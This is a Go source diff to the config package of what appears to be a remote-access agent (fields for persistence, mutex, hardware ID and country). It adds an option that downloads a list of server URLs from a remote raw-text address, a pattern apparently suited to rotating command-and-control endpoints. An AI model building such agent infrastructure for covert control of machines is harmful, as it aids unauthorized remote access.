@@ -1,11 +1,15 @@
 package config
 
 import (
+	"bufio"
+	"bytes"
 	"crypto/sha256"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
+	"net/http"
 	"net/url"
 	"os"
 	"runtime"
@@ -17,6 +21,7 @@ const AgentVersion = "0"
 
 var DefaultPersistence = "false"
 var DefaultServerURL = "wss://127.0.0.1:5173"
+var DefaultServerURLIsRaw = "false"
 var DefaultMutex = ""
 var DefaultID = ""
 var DefaultCountry = ""
@@ -39,6 +44,7 @@ type serverIndexData struct {
 type Config struct {
 	ServerURLs            []string
 	ServerIndex           int
+	RawServerListURL      string
 	Mutex                 string
 	ID                    string
 	HWID                  string
@@ -62,15 +68,33 @@ func Load() Config {
 		server = DefaultServerURL
 	}
 
+	rawServerFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_RAW"))
+	if rawServerFlag == "" {
+		rawServerFlag = DefaultServerURLIsRaw
+	}
+	rawServerEnabled := isTruthy(rawServerFlag)
+
 	serverURLs := []string{}
-	for _, url := range strings.Split(server, ",") {
-		normalized, err := normalizeServerURL(url)
-		if err != nil {
-			log.Printf("[config] WARNING: invalid server URL %q: %v", strings.TrimSpace(url), err)
-			continue
+	rawServerListURL := ""
+	if rawServerEnabled {
+		rawServerListURL = server
+		if rawServerListURL != "" {
+			if urls, err := LoadServerURLsFromRaw(rawServerListURL); err != nil {
+				log.Printf("[config] WARNING: failed to load raw server list from %q: %v", rawServerListURL, err)
+			} else {
+				serverURLs = urls
+			}
 		}
-		if normalized != "" {
-			serverURLs = append(serverURLs, normalized)
+	} else {
+		for _, url := range strings.Split(server, ",") {
+			normalized, err := normalizeServerURL(url)
+			if err != nil {
+				log.Printf("[config] WARNING: invalid server URL %q: %v", strings.TrimSpace(url), err)
+				continue
+			}
+			if normalized != "" {
+				serverURLs = append(serverURLs, normalized)
+			}
 		}
 	}
 
@@ -129,6 +153,7 @@ func Load() Config {
 	return Config{
 		ServerURLs:            serverURLs,
 		ServerIndex:           serverIndex,
+		RawServerListURL:      rawServerListURL,
 		Mutex:                 strings.TrimSpace(mutex),
 		ID:                    firstNonEmpty(fileSettings.ID, DefaultID, defaultID),
 		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
@@ -145,6 +170,81 @@ func Load() Config {
 		TLSClientCert:         tlsClientCert,
 		TLSClientKey:          tlsClientKey,
 	}
+}
+
+func isTruthy(value string) bool {
+	v := strings.ToLower(strings.TrimSpace(value))
+	return v == "true" || v == "1" || v == "yes" || v == "y"
+}
+
+func LoadServerURLsFromRaw(rawURL string) ([]string, error) {
+	trimmed := strings.TrimSpace(rawURL)
+	if trimmed == "" {
+		return nil, fmt.Errorf("raw server list URL is empty")
+	}
+
+	parsed, err := url.Parse(trimmed)
+	if err != nil {
+		return nil, err
+	}
+
+	if parsed.Scheme == "" {
+		parsed.Scheme = "https"
+	}
+
+	scheme := strings.ToLower(parsed.Scheme)
+	if scheme != "https" && scheme != "http" {
+		return nil, fmt.Errorf("unsupported raw server list scheme: %s", parsed.Scheme)
+	}
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(parsed.String())
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return nil, fmt.Errorf("unexpected status code %d", resp.StatusCode)
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	urls := []string{}
+	seen := map[string]struct{}{}
+	scanner := bufio.NewScanner(bytes.NewReader(body))
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		normalized, err := normalizeServerURL(line)
+		if err != nil {
+			log.Printf("[config] WARNING: invalid server URL in raw list %q: %v", line, err)
+			continue
+		}
+		if normalized == "" {
+			continue
+		}
+		if _, ok := seen[normalized]; ok {
+			continue
+		}
+		seen[normalized] = struct{}{}
+		urls = append(urls, normalized)
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	if len(urls) == 0 {
+		return nil, fmt.Errorf("raw server list returned no valid URLs")
+	}
+
+	return urls, nil
 }
 
 func loadServerIndex() int {
